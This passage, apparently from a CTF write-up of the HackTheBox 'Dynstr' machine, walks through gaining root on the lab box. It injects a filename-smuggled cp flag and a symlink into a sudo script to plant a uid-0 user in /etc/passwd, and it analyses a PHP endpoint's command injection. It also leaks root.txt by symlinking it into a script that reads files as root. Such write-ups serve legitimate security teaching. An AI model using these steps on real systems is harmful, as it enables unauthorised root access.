+</span><span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ </span><span class="nb">echo</span> <span class="s1">'oxdf:$1$KLTiIosS$EcdrRFwOKrCmloQFSZ2zn1:0:0:pwned:/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> passwd
+</code></pre></div></div>
+<p>The oxdf user is now uid and gid 0, which makes it root. And while passwords are typically hashed and stored in <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, they are still handled find from the <code class="language-plaintext highlighter-rouge">passwd</code> file.</p>
+<p>Second, I need a <code class="language-plaintext highlighter-rouge">.version</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$</span><span class="w"> </span><span class="nb">echo </span>1000 <span class="o">&gt;</span> .version
+</code></pre></div></div>
+<p>Third, I need the <code class="language-plaintext highlighter-rouge">--target-directory</code> flag as a file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$</span><span class="w"> </span><span class="nb">touch</span> <span class="nt">--</span> <span class="nt">--target-directory</span><span class="o">=</span>etc
+</code></pre></div></div>
+<p>Were I using this flag in a legit <code class="language-plaintext highlighter-rouge">cp</code> command, I would just say <code class="language-plaintext highlighter-rouge">--target-directory=/etc</code>, but since I’m injecting it as a filename, and filenames can’t include <code class="language-plaintext highlighter-rouge">/</code>, I’ll have to point to <code class="language-plaintext highlighter-rouge">etc</code> in the local directory.</p>
+<p>The forth file is a simlink from <code class="language-plaintext highlighter-rouge">./etc</code> to <code class="language-plaintext highlighter-rouge">/etc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$</span><span class="w"> </span><span class="nb">ln</span> <span class="nt">-s</span> /etc
+</code></pre></div></div>
+<p>That leaves the directory like:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 16
+drwx------  2 bindmgr bindmgr 4096 Jun 13 23:29  .
+drwxrwxrwt 17 root    root    4096 Jun 13 23:27  ..
+lrwxrwxrwx  1 bindmgr bindmgr    4 Jun 13 23:29  etc -&gt; /etc
+-rw-r--r--  1 bindmgr bindmgr 1698 Jun 13 23:28  passwd
+-rw-rw-r--  1 bindmgr bindmgr    0 Jun 13 23:29 '--target-directory=etc'
+-rw-rw-r--  1 bindmgr bindmgr    5 Jun 13 23:29  .version
+</span></code></pre></div></div>
+<p>Now I’ll run the script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$</span><span class="w"> </span><span class="nb">sudo </span>bindmgr.sh 
+<span class="go">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.Fk4IdAaCre.
+[+] Creating /etc/bind/named.conf.bindmgr file.
+[+] Staging files to /etc/bind/named.bindmgr.
+cp: -r not specified; omitting directory 'etc'
+cp: -r not specified; omitting directory '/etc/bind/named.bindmgr/'
+[+] Checking staged configuration.
+[-] ERROR: The generated configuration is not valid. Please fix following errors: 
+    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/etc: file not found
+</span></code></pre></div></div>
+<p>The user is now in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$</span><span class="w"> </span><span class="nb">tail</span> <span class="nt">-1</span> /etc/passwd
+<span class="gp">oxdf:$</span>1<span class="nv">$KLTiIosS$EcdrRFwOKrCmloQFSZ2zn1</span>:0:0:pwned:/root:/bin/bash
+</code></pre></div></div>
+<p>Running <code class="language-plaintext highlighter-rouge">su</code> and entering the password returns a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$</span><span class="w"> </span>su - oxdf
+<span class="go">Password: 
+root@dynstr:~# 
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="no-ip-api">no-ip API</h3>
+<p>The webserver is very simple on this box. There’s a static <code class="language-plaintext highlighter-rouge">index.html</code> page at the root, with the <code class="language-plaintext highlighter-rouge">assets</code> directory containing style and images:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">assets  attribution.txt  index.html  nic
+</span><span class="gp">www-data@dynstr:/var/www/html$</span><span class="w"> </span>find nic/ <span class="nt">-type</span> f <span class="nt">-ls</span>
+<span class="go">   285028      0 -rw-r--r--   1 root     root            0 Mar 12 19:41 nic/index.html
+   285029      4 -rw-r--r--   1 root     root         1110 Mar 13 19:40 nic/update
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">nic</code> directory has an empty <code class="language-plaintext highlighter-rouge">index.html</code> and the <code class="language-plaintext highlighter-rouge">update</code> path. <code class="language-plaintext highlighter-rouge">update</code> is actually PHP:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="c1">// Check authentication</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_AUTH_USER'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_AUTH_PW'</span><span class="p">]))</span>      <span class="p">{</span> <span class="k">echo</span> <span class="s2">"badauth</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_AUTH_USER'</span><span class="p">]</span><span class="mf">.</span><span class="s2">":"</span><span class="mf">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_AUTH_PW'</span><span class="p">]</span><span class="o">!==</span><span class="s1">'dynadns:sndanyd'</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"badauth</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
+
+  <span class="c1">// Set $myip from GET, defaulting to REMOTE_ADDR</span>
+  <span class="nv">$myip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$valid</span><span class="o">=</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'myip'</span><span class="p">],</span><span class="no">FILTER_VALIDATE_IP</span><span class="p">))</span>                       <span class="p">{</span> <span class="nv">$myip</span> <span class="o">=</span> <span class="nv">$valid</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+</code></pre></div></div>
+<p>This program first checks for the default cred pair, and exits if there’s no auth. It sets <code class="language-plaintext highlighter-rouge">$myip</code> to the remove server, and then if the <code class="language-plaintext highlighter-rouge">myip</code> GET parameter is a valid IP, it replaces it with that.</p>
+<p>Next it checks for a <code class="language-plaintext highlighter-rouge">hostname</code> GET parameter, and it it’s not there, it returns <code class="language-plaintext highlighter-rouge">nochg $myip\n</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+  <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'hostname'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"nochg </span><span class="nv">$myip</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Now it’s going to validate <code class="language-plaintext highlighter-rouge">hostname</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+    <span class="c1">// Check for a valid domain</span>
+    <span class="k">list</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'hostname'</span><span class="p">],</span><span class="mi">2</span><span class="p">);</span>
+    <span class="nv">$validds</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'dnsalias.htb'</span><span class="p">,</span><span class="s1">'dynamicdns.htb'</span><span class="p">,</span><span class="s1">'no-ip.htb'</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$validds</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"911 [wrngdom: </span><span class="nv">$d</span><span class="s2">]</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">explode</code> in PHP is like split in Python. It breaks the <code class="language-plaintext highlighter-rouge">hostname</code> into two pieces based at the first <code class="language-plaintext highlighter-rouge">.</code>, and stores the first part as <code class="language-plaintext highlighter-rouge">$h</code> and the back part as <code class="language-plaintext highlighter-rouge">$d</code> (presumably for host and domain). If <code class="language-plaintext highlighter-rouge">$d</code> isn’t in the list, it returns <code class="language-plaintext highlighter-rouge">wrngdom</code>.</p>
+<p>If the domain is ok, it continues and builds a string of <code class="language-plaintext highlighter-rouge">nsupdate</code> commands which are then pipped into <code class="language-plaintext highlighter-rouge">nsupdate</code> using <code class="language-plaintext highlighter-rouge">echo</code> inside <code class="language-plaintext highlighter-rouge">system</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+    <span class="c1">// Update DNS entry</span>
+    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"server 127.0.0.1</span><span class="se">\n</span><span class="s2">zone %s</span><span class="se">\n</span><span class="s2">update delete %s.%s</span><span class="se">\n</span><span class="s2">update add %s.%s 30 IN A %s</span><span class="se">\n</span><span class="s2">send</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$myip</span><span class="p">);</span>
+    <span class="nb">system</span><span class="p">(</span><span class="s1">'echo "'</span><span class="mf">.</span><span class="nv">$cmd</span><span class="mf">.</span><span class="s1">'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key'</span><span class="p">,</span><span class="nv">$retval</span><span class="p">);</span>
+    <span class="c1">// Return good or 911</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$retval</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">"good </span><span class="nv">$myip</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">"911 [nsupdate failed]</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+</code></pre></div></div>
+<p>The command injection is in <code class="language-plaintext highlighter-rouge">$h</code>, which is put into the <code class="language-plaintext highlighter-rouge">$cmd</code> twice, thus explaining why I got two pings. For example, the <code class="language-plaintext highlighter-rouge">whoami</code> payload I used was <code class="language-plaintext highlighter-rouge">$(whoami).no-ip.htb</code>. That would make the following pass to <code class="language-plaintext highlighter-rouge">nsupdate</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server 127.0.0.1
+zone no-ip.htb
+update delete <span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span>.no-ip-htb
+update add <span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span>.no-ip-htb 30 IN A 10.10.14.8
+send
+</code></pre></div></div>
+<p>That explains why it runs twice.</p>
+<h3 id="alternative-root-via-flag-leak">Alternative Root via Flag Leak</h3>
+<h4 id="method">Method</h4>
+<p>The version check in <code class="language-plaintext highlighter-rouge">bindmgr.sh</code> looks like:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> .version <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[-] ERROR: Check versioning. Exiting."</span>
+    <span class="nb">exit </span>42
+<span class="k">fi
+if</span> <span class="o">[[</span> <span class="s2">"</span><span class="sb">`</span><span class="nb">cat</span> .version 2&gt;/dev/null<span class="sb">`</span><span class="s2">"</span> <span class="nt">-le</span> <span class="s2">"</span><span class="sb">`</span><span class="nb">cat</span> <span class="nv">$BINDMGR_DIR</span>/.version 2&gt;/dev/null<span class="sb">`</span><span class="s2">"</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[-] ERROR: Check versioning. Exiting."</span>
+    <span class="nb">exit </span>43
+<span class="k">fi</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">-f</code> checks if the file is a regular file and it exists. That author intended that check to ensure that <code class="language-plaintext highlighter-rouge">.version</code> wasn’t a symlink. However, from the <a href="https://www.gnu.org/software/bash/manual/html_node/Bash-Conditional-Expressions.html">Bash Conditional Expressions docs</a>:</p>
+<blockquote>
+<p>Unless otherwise specified, primaries that operate on files follow symbolic links and operate on the target of the link, rather than the link itself.</p>
+</blockquote>
+<p><code class="language-plaintext highlighter-rouge">-h</code> or <code class="language-plaintext highlighter-rouge">-L</code> would have been appropriate choices here.</p>
+<p>As long as the file points to a valid file that exists and is readable by root, then it will pass that check. What happens if I symlink <code class="language-plaintext highlighter-rouge">.version</code> to <code class="language-plaintext highlighter-rouge">root.txt</code>? It will then try to compare the contents to the <code class="language-plaintext highlighter-rouge">.version</code> file in <code class="language-plaintext highlighter-rouge">/etc/bind/named.bindmgr</code>.</p>
+<p>I’ll drop into a new temp directory and try:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/dev/shm$</span><span class="w"> </span><span class="nb">cd</span> <span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="gp">bindmgr@dynstr:/tmp/tmp.3gN0fV4V9D$</span><span class="w"> </span><span class="nb">ln</span> <span class="nt">-s</span> /root/root.txt .version
+<span class="gp">bindmgr@dynstr:/tmp/tmp.3gN0fV4V9D$</span><span class="w"> </span><span class="nb">sudo </span>bindmgr.sh 
+<span class="go">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.3gN0fV4V9D.
+/usr/local/bin/bindmgr.sh: line 28: [[: 5dd462205002e72de695163969729020: value too great for base (error token is "5dd462205002e72de695163969729020")
+[+] Creating /etc/bind/named.conf.bindmgr file.
+[+] Staging files to /etc/bind/named.bindmgr.
+cp: cannot stat '*': No such file or directory
+[+] Checking staged configuration.
+[-] ERROR: The generated configuration is not valid. Please fix following errors: 
+    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found
+</span></code></pre></div></div>
+<p>It doesn’t like comparing the flag to a number, and prints the flag in the error message. When InfoSecJack got first blood, this was the technique he used.</p>
+<p>Similarly, shortcutting <code class="language-plaintext highlighter-rouge">named-checkconf</code> to the flag will print all but the last two characters in it’s error message:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/tmp$</span><span class="w"> </span><span class="nb">cd</span> <span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="gp">bindmgr@dynstr:/tmp/tmp.TTFzU6A8E7$</span><span class="w"> </span><span class="nb">echo </span>1000 <span class="o">&gt;</span> .version
+<span class="gp">bindmgr@dynstr:/tmp/tmp.TTFzU6A8E7$</span><span class="w"> </span><span class="nb">ln</span> <span class="nt">-s</span> /root/root.txt named-checkconf
+<span class="gp">bindmgr@dynstr:/tmp/tmp.TTFzU6A8E7$</span><span class="w"> </span><span class="nb">sudo </span>bindmgr.sh 
+<span class="go">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.TTFzU6A8E7.
+[+] Creating /etc/bind/named.conf.bindmgr file.
+[+] Staging files to /etc/bind/named.bindmgr.
+[+] Checking staged configuration.
+[-] ERROR: The generated configuration is not valid. Please fix following errors: 
+    /etc/bind/named.bindmgr/named-checkconf:1: unknown option '5dd462205002e72de6951639697290...'
+    /etc/bind/named.conf.bindmgr:3: unexpected token near end of file
+</span></code></pre></div></div>
+<h4 id="more-than-you-even-wanted-to-know-about-bash-number-comparisons">More Than You Even Wanted To Know About Bash Number Comparisons</h4>
+<p>You have to get a bit lucky for this one to work, as it won’t display for all flags. When I originally solved this, the leak worked, and I got the notes from just above. When verifying it months later for this post, it didn’t and that’s because the newly random <code class="language-plaintext highlighter-rouge">root.txt</code> started with <code class="language-plaintext highlighter-rouge">f</code>. The flag needs to start with a digit for this path.</p>
+<p>I’ll use a dummy command on my local console that’s the same check from Dynstr:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="k">if</span> <span class="o">[[</span> <span class="s2">"1001"</span> <span class="nt">-le</span> <span class="s2">"1000"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="s2">"less"</span><span class="p">;</span> <span class="k">else </span><span class="nb">echo</span> <span class="s2">"more"</span><span class="p">;</span> <span class="k">fi</span>
+<span class="go">more
+</span></code></pre></div></div>
+<p>If “1001” is less than “1000”, it’ll print “less”, else it’ll print “more”. In this case, as 1001 is greater than 1000, it prints “more”.</p>
+<p>To map this to Dynstr, the first string would be what’s in the local <code class="language-plaintext highlighter-rouge">.version</code> and the second is what’s in the master version.</p>
+<p>If I go to 999 for the first one, it prints less:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="k">if</span> <span class="o">[[</span> <span class="s2">"999"</span> <span class="nt">-le</span> <span class="s2">"1000"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="s2">"less"</span><span class="p">;</span> <span class="k">else </span><span class="nb">echo</span> <span class="s2">"more"</span><span class="p">;</span> <span class="k">fi</span>
+<span class="go">less
+</span></code></pre></div></div>
+<p>All as expected so far.</p>
+<p>There’s two issues that come into play. First, Bash will handle numbers up to signed 64-bit integers, as this <a href="https://superuser.com/questions/1030122/what-is-the-maximum-value-of-a-numeric-bash-shell-variable">StackOverflow post</a> demonstrates. I’ll show a subset of it here as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="o">((</span><span class="nv">X</span><span class="o">=(</span>2<span class="k">**</span>63<span class="o">)</span><span class="nt">-1</span><span class="o">))</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$X</span>
+<span class="go">9223372036854775807
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="o">((</span>X++<span class="o">))</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$X</span>
+<span class="go">-9223372036854775808
+</span></code></pre></div></div>
+<p>The largest number that Bash is holding in a variable on my system is 2<sup>63</sup>-1. One more than that rolls around to the most negative number that fits in a two’s complement 64-bit signed int.</p>
+<p>So when I put a 128 bit number in (the MD5 hash from <code class="language-plaintext highlighter-rouge">root.txt</code>), it’s not necessarily going to behave as expected. For example, if the hash were all 9s, it prints “less”, not “more”:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="k">if</span> <span class="o">[[</span> <span class="s2">"99999999999999999999999999999999"</span> <span class="nt">-le</span> <span class="s2">"1000"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="s2">"less"</span><span class="p">;</span> <span class="k">else </span><span class="nb">echo</span> <span class="s2">"more"</span><span class="p">;</span> <span class="k">fi</span>
+<span class="go">less
+</span></code></pre></div></div>
+<p>That’s because it is actually rolling over into a negative number:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="o">((</span><span class="nv">X</span><span class="o">=</span>99999999999999999999999999999999<span class="o">))</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$X</span>
+<span class="go">-8814407033341083649
+</span></code></pre></div></div>
+<p>The other issue comes into plan when I add a non-digit to the string, like one of the hex characters in the MD5 hash:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="k">if</span> <span class="o">[[</span> <span class="s2">"999999999999999999a9999999999999"</span> <span class="nt">-le</span> <span class="s2">"1000"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="s2">"less"</span><span class="p">;</span> <span class="k">else </span><span class="nb">echo</span> <span class="s2">"more"</span><span class="p">;</span> <span class="k">fi</span>
+<span class="go">-bash: [[: 999999999999999999a9999999999999: value too great for base (error token is "999999999999999999a9999999999999")
+more
+</span></code></pre></div></div>
+<p>The base in this case is 10, and therefore the “a” is “too great for the base”. That’s what prints the message.</p>
+<p>However, if the first digit is a character, for some reason, Bash makes the entire value 0:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="o">((</span><span class="nv">X</span><span class="o">=</span>a999999999a9e9999999999999c99999<span class="o">))</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$X</span>
+<span class="go">0
+</span></code></pre></div></div>
+<p>So the comparison goes off without an issue:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="k">if</span> <span class="o">[[</span> <span class="s2">"a99999999999999999a9999999999999"</span> <span class="nt">-le</span> <span class="s2">"1000"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="s2">"less"</span><span class="p">;</span> <span class="k">else </span><span class="nb">echo</span> <span class="s2">"more"</span><span class="p">;</span> <span class="k">fi</span>
+<span class="go">less
+</span></code></pre></div></div>
+<p>The flag leak occurs in the error message when there’s a character in the hash, but not the first character.</p>
+<p>Some quick math to find out how often this will work:</p>
+<p>All MD5 hashes: 16<sup>32</sup> = 340282366920938463463374607431768211456</p>
+<p>MD5 hashes all digits: 10<sup>32</sup> = 100000000000000000000000000000000</p>
+<p>MD5 hashes that start with a character: 16<sup>31</sup> * 6 = 127605887595351923798765477786913079296</p>
+<p>Because the two sets that don’t work don’t overlap (if it’s all digits, it can’t start with a character), I can add those together and divide by the total and get the percentage of the time it won’t work, which is about 37.5% of randomly generated flags. That means for 62.5% of flags, it will work.</p>
+<p>It turns out that the chance of getting a hash with no characters in it are so small (0.00003%), it’s not really important to the calculation.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/10/16/htb-dynstr.html"></a>
+</article>
